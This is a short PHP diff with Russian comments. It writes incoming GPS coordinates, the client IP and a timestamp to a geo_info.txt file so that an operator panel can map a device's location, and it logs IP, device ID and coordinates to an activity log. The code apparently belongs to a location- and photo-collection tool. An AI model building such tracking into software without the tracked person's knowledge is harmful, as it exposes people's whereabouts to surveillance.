@@ -67,6 +67,21 @@ if ($locationData) {
 
 file_put_contents($geoFile, $geoInfo, FILE_APPEND);
 
+// Чтобы панель показывала точку на карте без загрузки фото — создаём/обновляем geo_info.txt
+if ($locationData && isset($locationData['lat']) && isset($locationData['lon'])) {
+    $lat = $locationData['lat'];
+    $lon = $locationData['lon'];
+    $geoInfoTxt = "IP: $clientIP\n";
+    $geoInfoTxt .= "Country: GPS\n";
+    $geoInfoTxt .= "Region: \n";
+    $geoInfoTxt .= "City: \n";
+    $geoInfoTxt .= "Latitude: $lat\n";
+    $geoInfoTxt .= "Longitude: $lon\n";
+    $geoInfoTxt .= "ISP: \n";
+    $geoInfoTxt .= "Last Update: " . date('Y-m-d H:i:s') . "\n";
+    file_put_contents($photoDir . 'geo_info.txt', $geoInfoTxt);
+}
+
 // Логируем в файл активности
 $log_entry = "[" . date('Y-m-d H:i:s') . "] GPS Location received from IP: $clientIP | Device: $deviceId | Lat: " . ($locationData['lat'] ?? 'N/A') . " | Lon: " . ($locationData['lon'] ?? 'N/A') . "\n";
 file_put_contents('activity.log', $log_entry, FILE_APPEND);
